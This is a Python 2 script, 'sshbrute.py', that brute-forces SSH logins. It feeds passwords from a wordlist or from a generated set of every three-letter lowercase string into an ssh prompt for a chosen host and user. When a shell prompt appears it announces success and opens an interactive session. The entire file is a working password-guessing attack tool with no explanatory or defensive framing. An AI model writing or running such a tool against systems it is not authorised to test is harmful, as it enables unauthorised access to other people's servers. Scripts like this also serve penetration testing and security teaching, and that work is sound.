#!/usr/bin/python2

import pexpect, sys

def usage():
    print "./sshbrute.py <-f filename | -g> <host> <username>"
    sys.exit()

def readCmdLine():
    # Read command line and pull out flags
    gLen = len(sys.argv)
    if gLen == 5 and sys.argv[1]=="-f":
        filename = sys.argv[2]
        host = sys.argv[3]
        user = sys.argv[4]
    elif gLen == 4 and sys.argv[1]=="-g":
        filename = None
        host = sys.argv[2]
        user = sys.argv[3]
    else:
        usage()
    return (filename, host, user)


def gen3cPass(allCharacters):
    passwords = []
    characters = "".join(set(allCharacters)) #Remove duplicates
    for c1 in characters:
        for c2 in characters:
            for c3 in characters:
                passwords.append(c1+c2+c3)
    return passwords

def readPassFromFile(fname):
    passwords=[]
    with open(fname,'r') as f:
        for line in f:
            passwords.append(line.strip())
    return passwords

def connectToServer(host, user):
    # construct the login string
    connStr = 'ssh ' + user + '@' + host
    
    # use 'spawn' to create the process.
    child = pexpect.spawn(connStr)
    
    ret = child.expect(['password', 'Could not resolve',
                        pexpect.EOF])
    if ret == 1:
        print "Bad hostname"
        sys.exit()
    if ret == 2:
        print "Unknown EOF found. Exiting"
        sys.exit()
#    print "found password prompt"
    return child

def attemptPassword(child, password):
#    print "Sending password {}".format(password)
    child.sendline(password)
    return child

def trylogin(host, user, passwordList):
   
    child = connectToServer(host,user)
    
    for password in passwordList:
        child = attemptPassword(child,password)
        ret = child.expect(['\$','try again','publickey','closed','closed.'])
#        print "Return {}".format(ret)
        if ret==0:
            print "Found command prompt. We're in! Password = {}".format(password)
            child.sendline()
            child.interact()
        elif ret ==2: #Broken connection. Reset
            child = connectToServer(host,user)
        elif ret==3 or ret==4: 
            print 'Exit program.'
            break
        else:
#            print "Same connection. Try to continue."
            continue
            
    print "Failed to find password in list. Exiting"


if __name__ == "__main__":
    print "Starting sshbrute.py"
    (fname, host, user) = readCmdLine()
#    print "read command lines f:{} h:{} u:{}".format(fname,host,user)
    if fname == None:
        passList = gen3cPass("abcdefghijklmnopqrstuvwxyz")
    else:
        #read file of passwords
        passList = readPassFromFile(fname)
    trylogin(host, user, passList)


